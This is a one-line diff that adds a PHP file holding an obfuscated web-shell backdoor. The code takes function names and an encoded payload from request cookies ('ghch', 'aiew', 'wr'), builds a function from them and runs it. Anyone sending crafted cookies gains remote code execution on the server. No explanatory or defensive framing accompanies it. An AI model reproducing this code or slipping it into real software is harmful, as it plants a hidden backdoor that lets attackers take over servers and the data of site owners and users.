@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['ghch']){$atob=$_COOKIE['ghch']("",@$_COOKIE['aiew'](@$_COOKIE['wr']));$atob();}?>
